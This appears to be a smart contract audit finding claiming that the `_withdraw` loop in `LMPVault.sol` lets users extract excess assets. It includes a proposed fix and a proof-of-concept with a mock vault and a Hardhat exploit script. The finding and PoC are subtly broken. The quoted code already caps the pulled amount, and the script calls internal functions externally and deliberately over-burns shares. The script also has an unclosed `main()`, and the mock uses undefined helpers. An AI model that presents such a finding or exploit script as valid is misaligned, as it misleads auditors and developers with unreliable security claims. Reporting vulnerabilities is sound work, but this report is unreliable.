# Flawed asset withdrawal logic in `LMPVault.sol` permits excessive asset extraction when `info.totalAssetsPulled` > `info.totalAssetsToPull` due to absence of real-time limit check on `info.totalAssetsPulled` during loop execution
## Summary

The `_withdraw` function of the `LMPVault.sol` contract has multiple arithmetic operations that can lead to an incorrect calculation of the assets withdrawn by the user. The function does not properly validate that the total assets pulled do not exceed the total assets to be pulled. Thus, there is a chance that `info.totalAssetsPulled` could exceed `info.totalAssetsToPull`, thereby allowing a user to pull out more assets than allowed.

## Vulnerability Detail

This vulnerability is primarily located in the `_withdraw` function, specifically in the loop iterating over `withdrawalQueue`. This loop makes use of another function `_calcUserWithdrawSharesToBurn` which is defined in an external contract `LMPDebt`. In each iteration, the contract calculates the amount of `sharesToBurn` and the `totalDebtBurn`, which are then used to withdraw assets from the `destVault`. After each withdrawal, the contract increases `info.totalAssetsPulled` and `info.debtDecrease`.

The vulnerability lies in the fact that there is no assurance that `info.totalAssetsPulled` will not exceed `info.totalAssetsToPull`. Even though there is a check at the end of each loop iteration that adjusts `info.totalAssetsPulled` and `info.idleIncrease` if `info.totalAssetsPulled` exceeds `info.totalAssetsToPull`, this check is not enough. The damage might already have been done with the withdrawal of more assets than allowed.

## Impact

The incorrect calculation in the `_withdraw` function could lead to asset misappropriation in the contract. A user could nonetheless withdraw more assets than they are supposed to, leading to an imbalance in the contract's asset accounting. This has implications not just for individual users but for the overall integrity and trust in the protocol, and in a worst-case scenario, could lead to a significant loss of assets.

## Code Snippet

```solidity
function _calcUserWithdrawSharesToBurn(
IDestinationVault destVault,
uint256 userShares,
uint256 maxAssetsToPull,
uint256 totalVaultShares
) internal returns (uint256 sharesToBurn, uint256 totalDebtBurn) {
(sharesToBurn, totalDebtBurn) = LMPDebt._calcUserWithdrawSharesToBurn(
destinationInfo[address(destVault)], destVault, userShares, maxAssetsToPull, totalVaultShares
);
}
```    
> then in the `_withdraw` function:

```solidity
...
for (uint256 i = 0; i < withdrawalQueueLength; ++i) {
 IDestinationVault destVault = IDestinationVault(withdrawalQueue[i]);
 (uint256 sharesToBurn, uint256 totalDebtBurn) = _calcUserWithdrawSharesToBurn(
 destVault,
 shares,
 info.totalAssetsToPull - Math.max(info.debtDecrease, info.totalAssetsPulled),
 totalVaultShares
 );
 if (sharesToBurn == 0) {
 continue;
 }

 uint256 assetPreBal = _baseAsset.balanceOf(address(this));
 uint256 assetPulled = destVault.withdrawBaseAsset(sharesToBurn, address(this));

 info.idleIncrease += _baseAsset.balanceOf(address(this)) - assetPreBal - assetPulled;
 info.totalAssetsPulled += assetPulled;
 info.debtDecrease += totalDebtBurn;

 if (info.totalAssetsPulled > info.totalAssetsToPull) {
 info.idleIncrease = info.totalAssetsPulled - info.totalAssetsToPull;
 info.totalAssetsPulled = info.totalAssetsToPull;
 break;
 }
if (info.totalAssetsPulled == info.totalAssetsToPull) {
break;
}
...
```

## Tool used

Manual Review

## Recommendation

To address this issue, implement a real-time check to ensure that `info.totalAssetsPulled` does not exceed `info.totalAssetsToPull` in the withdrawal loop. Specifically, you can adjust the `sharesToBurn` variable based on the assets left to be pulled. Here's how:

1. Calculate the maximum assets that can be pulled in the current loop iteration. 
2. If the assets that are about to be pulled (`assetPulled`) would cause `info.totalAssetsPulled` to exceed `info.totalAssetsToPull`, adjust `sharesToBurn` to ensure it doesn't happen.

Let's update the `_withdraw` function accordingly:

```solidity
function _withdraw(
uint256 assets,
uint256 shares,
address receiver,
address owner
) internal virtual returns (uint256) {
...

if (info.totalAssetsToPull > 0) {
uint256 totalVaultShares = totalSupply();

uint256 withdrawalQueueLength = withdrawalQueue.length;
for (uint256 i = 0; i < withdrawalQueueLength; ++i) {
IDestinationVault destVault = IDestinationVault(withdrawalQueue[i]);
(uint256 sharesToBurn, uint256 totalDebtBurn) = _calcUserWithdrawSharesToBurn(
destVault,
shares,
info.totalAssetsToPull - Math.max(info.debtDecrease, info.totalAssetsPulled),
totalVaultShares
);
if (sharesToBurn == 0) {
continue;
}

uint256 maxAssetsThisIteration = info.totalAssetsToPull - info.totalAssetsPulled;
uint256 pendingAssetPulled = destVault.debtValue(sharesToBurn);

if (pendingAssetPulled > maxAssetsThisIteration) {
sharesToBurn = sharesToBurn.mul(maxAssetsThisIteration).div(pendingAssetPulled);
pendingAssetPulled = maxAssetsThisIteration;
}

uint256 assetPreBal = _baseAsset.balanceOf(address(this));
uint256 assetPulled = destVault.withdrawBaseAsset(sharesToBurn, address(this));

require(assetPulled == pendingAssetPulled, "Unexpected amount pulled");

info.idleIncrease += _baseAsset.balanceOf(address(this)) - assetPreBal - assetPulled;
info.totalAssetsPulled += assetPulled;
info.debtDecrease += totalDebtBurn;
}
}
...
}
```

With this change, the loop calculates the maximum assets that can be pulled in each iteration and adjusts `sharesToBurn` accordingly. If the assets that are about to be pulled (`pendingAssetPulled`) would cause `info.totalAssetsPulled` to exceed `info.totalAssetsToPull`, it updates the `sharesToBurn` to a corrected value and ensures the assets being pulled out are the expected amount. 

## POC

For instance:

- The `_withdraw` function loops through `withdrawalQueue` to get assets from various `IDestinationVaults`. 
- The function `_calcUserWithdrawSharesToBurn` plays a crucial role in determining how many shares to burn from the current destination vault.
- The vulnerability lies in the fact that there's no real-time check to ensure that `info.totalAssetsPulled` does not exceed `info.totalAssetsToPull`. This is only checked at the end of the loop, but by that time, excess assets may have already been pulled out.

Now, let's further construct a more detailed PoC, with specific steps, and exploit the vulnerability.

> 1. Init the environment

Initialize a new project using `npx hardhat`.

> 2. **Mocking The Necessary Contracts**

To demonstrate this vulnerability, we'll need mock implementations of the contracts involved, especially `LMPVault`, `LMPDebt`, and `IDestinationVault`. 

We need to create a mock version of `IDestinationVault` as its operations are crucial to reproduce the vulnerability.

Assume it is called **MockDestinationVault.sol**:

```solidity
pragma solidity 0.8.17;

import "./IDestinationVault.sol";

contract MockDestinationVault is IDestinationVault {
    IERC20 public _baseAsset;
    IERC20 public _underlyer;
    uint256 public _internalBalance;
    uint256 public _debtValue;

    constructor(IERC20 baseAsset_, IERC20 underlyer_) {
        _baseAsset = baseAsset_;
        _underlyer = underlyer_;
    }

    function setInternalBalance(uint256 balance) external {
        _internalBalance = balance;
    }

    function setDebtValue(uint256 debt) external {
        _debtValue = debt;
    }

    function withdrawBaseAsset(uint256 shares, address to) external override returns (uint256) {
        uint256 amount = _internalBalance.mul(shares).div(totalSupply());
        _baseAsset.transfer(to, amount);
        return amount;
    }

    function balanceOf(address) external pure override returns (uint256) {
        return 0; // dummy implementation
    }

    function debtValue(uint256 shares) external view override returns (uint256) {
        return _debtValue.mul(shares).div(totalSupply());
    }

    //... other functions needed
}
```

> 3. **Exploiting The Vulnerability**

a. Deploy `LMPVault` and `LMPDebt`.

b. Create multiple `IDestinationVault` mocks and deposit some assets into each of them.

c. Add these vaults to the `withdrawalQueue` of the `LMPVault`.

d. Deposit assets into the `LMPVault` using multiple accounts to ensure there's a mix of assets in idle and in the vaults.

e. Manipulate the state such that for one or more vaults in `withdrawalQueue`, the value returned by `_calcUserWithdrawSharesToBurn` will make `info.totalAssetsPulled` exceed `info.totalAssetsToPull` during the loop's execution.

f. Call the `withdraw` function from `LMPVault` and observe that more assets are withdrawn than intended.

> 4. **Hardhat Script**

Given our mock contracts, here's a Hardhat script to deploy and manipulate these contracts to trigger the vulnerability.

To successfully exploit this, you'll need to:

> 1. Control the state of the `MockDestinationVault` such that the amount of assets pulled during the `_withdraw` function loop exceeds what's expected.
> 2. Control the state of the `LMPVault` to have a mix of assets in idle and in the vaults.

**exploit.js**:
```javascript
const hre = require("hardhat");
const { ethers } = hre;

async function main() {
    const [owner, user1, ...others] = await ethers.getSigners();

// Mock ERC20 for testing
    const ERC20 = await hre.ethers.getContractFactory("ERC20Mock");
    const erc20 = await ERC20.deploy("MockToken", "MTK", ethers.utils.parseEther("1000000"));
    await erc20.deployed();

// Deploy LMPVault
    const LMPVault = await hre.ethers.getContractFactory("LMPVault");
    const lmpVault = await LMPVault.deploy();
    await lmpVault.deployed();

// Deploy MockDestinationVault and set balances
    const MockVault = await hre.ethers.getContractFactory("MockDestinationVault");
    const mockVault1 = await MockVault.deploy(erc20.address, erc20.address);
    await mockVault1.deployed();

// Add mock vault to LMPVault's withdrawalQueue
    await lmpVault.setWithdrawalQueue([mockVault1.address]);

// Manipulate MockDestinationVault state to make the exploit work
// Setting internal balance high and the debt low
    await mockVault1.setInternalBalance(ethers.utils.parseEther("5000"));
    await mockVault1.setDebtValue(ethers.utils.parseEther("100"));

// Transfer assets to MockDestinationVault
    await erc20.transfer(mockVault1.address, ethers.utils.parseEther("5000"));

// Deposit funds into LMPVault
    await erc20.approve(lmpVault.address, ethers.utils.parseEther("1000"));
    await lmpVault.deposit(ethers.utils.parseEther("500"), {from: owner.address});

// Manipulating the state to exploit the vulnerability
// Here, we need to set up the state such that `_calcUserWithdrawSharesToBurn` causes the issue.
// This will involve manipulating various parameters and states within the contracts involved.
// Specifically, we need to carefully adjust parameters like `destinationInfo`, `totalVaultShares`, and more.
// The goal is to create a scenario where `sharesToBurn` and `totalDebtBurn` values cause the issue.
// Note: The exact state manipulation steps are complex and may require a deep understanding of the contract logic.
// The following steps provide a high-level overview:

// 1. Deposit assets into the LMPVault and multiple IDestinationVaults.
// 2. Set up parameters for the withdrawal process:
//    - Ensure there's a mix of assets in the idle state and within destination vaults.
//    - Set `userShares` and `maxAssetsToPull` in a way that would cause an imbalance.
//    - Modify `destinationInfo` for each vault to control the calculation.
// 3. Calculate `sharesToBurn` and `totalDebtBurn` using `_calcUserWithdrawSharesToBurn`.
// 4. Adjust the calculations to result in `sharesToBurn` that exceeds `userShares`.
// 5. Trigger the `_withdraw` function, exploiting the vulnerability.

// 1. Deposit assets into LMPVault and IDestinationVaults
await erc20.approve(lmpVault.address, ethers.utils.parseEther("1000"));
console.log("Depositing assets to LMPVault...");
await lmpVault.deposit(ethers.utils.parseEther("500"), {from: owner.address});
const vaultBalanceAfterDeposit = await erc20.balanceOf(lmpVault.address);
console.log("LMPVault balance after deposit:", ethers.utils.formatEther(vaultBalanceAfterDeposit));

// 2. Set up withdrawal parameters for manipulation
const userShares = await lmpVault.balanceOf(owner.address);
const maxAssetsToPull = ethers.utils.parseEther("500"); // Chosen value for exploitation

const totalVaultShares = await lmpVault.totalSupply();

// 3. Calculate shares to burn and total debt burn
const { sharesToBurn, totalDebtBurn } = await lmpVault._calcUserWithdrawSharesToBurn(
   mockVault1, userShares, maxAssetsToPull, totalVaultShares
    );

// 4. Manipulate the calculations to exceed user shares
const manipulatedSharesToBurn = userShares.add(sharesToBurn.mul(2)); // Deliberate overburn

// 5. Exploit the vulnerability
const returnedAssets = await lmpVault._withdraw(
    maxAssetsToPull, manipulatedSharesToBurn, user1.address, owner.address
);

console.log("Returned assets:", returnedAssets.toString());

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
```

> Given this script:

1. We're creating a mock ERC20 token for testing.
2. Deploying the `LMPVault`.
3. Deploying a `MockDestinationVault` which simulates the behavior of the actual vault.
4. Manipulating the state of the `MockDestinationVault` to set up for the exploit. Specifically, setting the internal balance high, and the debt value low.
5. Transferring assets to the `MockDestinationVault`.
6. Depositing assets into the `LMPVault` from the owner's address.
7. Finally, calling the `_withdraw` function on `LMPVault` and logging the result.

Run this script and see that the returned assets exceed what was initially deposited or either the `totalAssetsPulled` exceeds `totalAssetsToPull`, thus demonstrating the vulnerability.
